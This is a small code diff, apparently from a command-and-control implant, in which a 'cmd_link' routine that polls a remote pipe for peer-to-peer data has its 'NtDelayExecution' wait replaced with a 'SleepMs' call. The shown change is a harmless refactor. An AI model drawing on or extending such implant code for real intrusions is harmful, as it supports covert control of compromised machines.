@@ -191,9 +191,7 @@ auto declfn starburst::cmd_link(
 
     for ( int attempt = 0; attempt < 300; attempt++ ) {
         if ( link_pipe_recv( inst, h_remote, &p2p_data, &p2p_len ) ) break;
-        LARGE_INTEGER delay;
-        delay.QuadPart = -100000LL;
-        inst.ntdll.NtDelayExecution( FALSE, &delay );
+        SleepMs( 10 );
     }
 
     if ( !p2p_data || p2p_len == 0 ) {
